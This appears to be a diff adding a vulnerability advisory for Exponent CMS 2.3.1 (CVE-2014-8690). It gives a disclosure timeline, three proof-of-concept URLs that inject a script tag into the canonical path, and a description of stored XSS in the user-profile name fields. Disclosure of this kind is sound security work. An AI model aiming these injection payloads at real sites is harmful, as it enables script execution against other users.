@@ -1,0 +1,48 @@
+######################
+# Exploit Title: Multiple Exponent CMS Cross-Site Scripting Vulnerabilies
+# Discovered by-
+# Mayuresh Dani (mdani@qualys.com)
+# Narendra Shinde (nshinde@qualys.com)
+# Vendor Homepage: http://www.exponentcms.org/
+# Software Link:
+http://sourceforge.net/projects/exponentcms/files/exponent-2.3.1.zip/download
+# Version: 2.3.1
+# Date: 2014-10-11
+# Tested on: Windows 7 / Mozilla Firefox
+#            Ubuntu 14.04 / Mozilla Firefox
+# CVE: CVE-2014-8690
+######################
+# Vulnerability Disclosure Timeline:
+# 2014-11-04:  Discovered vulnerability
+# 2014-11-04:  Vendor Notification
+# 2014-11-05:  Vendor confirmation
+# 2014-11-06:  Vendor fixes Universal XSS -
+http://www.exponentcms.org/news/security-patch-released-for-v2-1-4-v2-2-3-and-v2-3-0
+# 2015-02-12:  Public Disclosure
+######################
+# Description
+# Exponent CMS is a free, open source, open standards modular enterprise
+software framework and content management system (CMS) written in the PHP.
+#
+# CVE-2014-8690:
+# Universal XSS - Exponent CMS builds the canonical path field from an
+unsanitized URL, which can be used to execute arbitrary scripts.
+# Examples:
+#
+http://server/news/show/title/time-for-a-heavy-harvest-new-release/src/%22%3E%3Cscript%3Ealert%287%29%3C/script%3E@random4cd201e063d5c
+#
+http://server/news/show/title/%22%3E%3Cscript%3Ealert%287%29%3C/script%3Etime-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c
+#
+http://server/news/%22%3E%3Cscript%3Ealert%287%29%3C/script%3Eshow/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c
+#
+# 2.b. XSS in user profiles.
+# The "First Name" and "Last Name" fields on
+http://server/exponent/users/edituser are not sufficiently sanitized. Enter
+your favourite script and the application will execute it everytime for you.
+#
+# More information and PoCs -
+http://exponentcms.lighthouseapp.com/projects/61783/tickets/1230-universal-cross-site-scripting-in-exponent-cms-231-and-prior
+#
+#
+# Thanks,
+# Mayuresh & Narendra
